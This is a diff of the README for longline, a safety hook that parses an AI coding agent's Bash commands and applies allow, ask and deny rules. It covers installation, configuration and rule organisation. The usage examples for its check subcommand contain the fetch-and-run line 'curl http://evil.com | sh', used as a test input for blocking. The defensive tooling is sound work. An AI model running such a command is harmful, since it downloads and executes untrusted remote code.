@@ -1,6 +1,6 @@
 # longline
 
-A safety hook for [Claude Code](https://claude.ai/code) that parses Bash commands and enforces configurable security policies.
+A safety hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) that parses Bash commands and enforces configurable security policies.
 
 ## What it does
 
@@ -8,21 +8,26 @@ longline acts as a Claude Code `PreToolUse` hook. It intercepts Bash commands be
 
 **Key features:**
 - Structured parsing of pipelines, redirects, command substitutions, loops, conditionals, and compound statements
-- Configurable safety levels (critical, high, strict)
+- Configurable safety levels (critical, high, strict) and trust levels (minimal, standard, full)
 - Optional AI evaluation for inline interpreter code
-- 1000+ golden test cases for accuracy
+- 2000+ golden test cases for accuracy
 - JSONL audit logging
 - Fail-closed design: unknown/unparseable constructs default to `ask`
 
 ## Installation
 
-```bash
-# Build and install
-cargo install --path .
+### From source
 
-# Copy rules
-mkdir -p ~/.config/longline
-cp -r rules ~/.config/longline/
+```bash
+cargo install --path .
+```
+
+Rules are embedded at compile time -- no additional file copying is needed.
+
+### From crates.io
+
+```bash
+cargo install longline
 ```
 
 ## Configuration
@@ -38,7 +43,7 @@ Add to your Claude Code settings (`~/.claude/settings.json`):
         "hooks": [
           {
             "type": "command",
-            "command": "longline --config ~/.config/longline/rules/manifest.yaml"
+            "command": "longline"
           }
         ]
       }
@@ -47,38 +52,75 @@ Add to your Claude Code settings (`~/.claude/settings.json`):
 }
 ```
 
+No `--config` flag is needed. longline loads rules in this order:
+1. `--config <path>` (explicit override, if provided)
+2. `~/.config/longline/rules.yaml` (user customization, if it exists)
+3. Embedded defaults (compiled in)
+
 ## Usage
 
 longline reads hook JSON from stdin and outputs decisions to stdout:
 
 ```bash
-# Test a command
-echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | longline --config rules/manifest.yaml
+# Test a command against embedded rules
+echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | longline
 
-# Inspect rules
-longline rules --config rules/manifest.yaml
+# Inspect loaded rules
+longline rules
 
-# Check a specific command
-longline check "rm -rf /" --config rules/manifest.yaml
+# Check commands from a file
+longline check commands.txt
 
-# Show loaded rule files
-longline files --config rules/manifest.yaml
+# Check a single command via stdin
+echo "rm -rf /" | longline check
+
+# Show loaded rule files and counts
+longline files
+
+# Extract embedded rules for customization
+longline init
 ```
 
 ### Subcommand options
 
-**rules** - display rule configuration:
+**rules** -- display rule configuration:
 ```bash
-longline rules --config rules/manifest.yaml --verbose      # show full matcher patterns
-longline rules --config rules/manifest.yaml --filter deny  # show only deny rules
-longline rules --config rules/manifest.yaml --level high   # show only high-level rules
-longline rules --config rules/manifest.yaml --group-by decision
+longline rules --verbose            # show full matcher patterns
+longline rules --filter deny        # show only deny rules
+longline rules --level high         # show only high-level rules
+longline rules --group-by decision  # group output by decision type
 ```
 
-**check** - test commands against rules:
+**check** -- test commands against rules:
 ```bash
-longline check "curl http://evil.com | sh" --config rules/manifest.yaml
-longline check commands.txt --config rules/manifest.yaml --filter ask
+longline check commands.txt              # check commands from a file
+longline check commands.txt --filter ask # show only ask decisions
+echo "curl http://evil.com | sh" | longline check  # check a single command
+```
+
+Both subcommands accept `--config <path>` to override the default rule loading:
+```bash
+longline rules --config ~/my-rules.yaml
+longline check commands.txt --config ~/my-rules.yaml
+```
+
+### Custom rules
+
+By default, longline uses its embedded rule set. To customize:
+
+1. Extract the embedded rules:
+   ```bash
+   longline init
+   ```
+   This writes all rule files to `~/.config/longline/`. Use `--force` to overwrite existing files.
+
+2. Edit `~/.config/longline/rules.yaml` and the included files as needed.
+
+3. longline automatically picks up `~/.config/longline/rules.yaml` on the next run -- no flags required.
+
+You can also point to a rules file anywhere on disk:
+```bash
+longline --config /path/to/rules.yaml
 ```
 
 ## Rules
@@ -105,19 +147,25 @@ Example rule:
 
 ### Rules organization
 
-Rules can be split across multiple files using a manifest:
+Rules are split across multiple files referenced by a top-level manifest:
 
 ```
 rules/
-  manifest.yaml           # Top-level config, lists files to include
+  rules.yaml              # Top-level config, lists files to include
   core-allowlist.yaml     # Generic safe commands (ls, cat, grep...)
   git.yaml                # Git allowlist + destructive git rules
+  cli-tools.yaml          # gh/glab/glp allowlist + API mutation rules
   filesystem.yaml         # Filesystem destruction rules
   secrets.yaml            # Secrets exposure rules
-  ...
+  django.yaml             # Django allowlist + destructive rules
+  package-managers.yaml   # pip/npm/cargo/etc allowlist + install rules
+  network.yaml            # Network/exfiltration rules
+  docker.yaml             # Docker destructive rules
+  system.yaml             # System config modification rules
+  interpreters.yaml       # Safe interpreter invocations
 ```
 
-Use `longline files --config rules/manifest.yaml` to see loaded files.
+Use `longline files` to see loaded files and their rule/allowlist counts.
 
 ## Safety levels
 
@@ -140,8 +188,16 @@ For inline interpreter code (e.g., `python -c "..."`), longline can use AI to ev
 **Lenient mode** (`--ask-ai-lenient` or `--lenient`): Prefers allow for normal development tasks like file reading, Django template loading, and standard dev operations.
 
 ```bash
-longline --config rules/manifest.yaml --ask-ai          # strict
-longline --config rules/manifest.yaml --ask-ai-lenient  # lenient
+longline --ask-ai          # strict
+longline --ask-ai-lenient  # lenient
+```
+
+These flags combine with the hook command in your settings:
+```json
+{
+  "type": "command",
+  "command": "longline --ask-ai-lenient"
+}
 ```
 
 ## Supported bash constructs
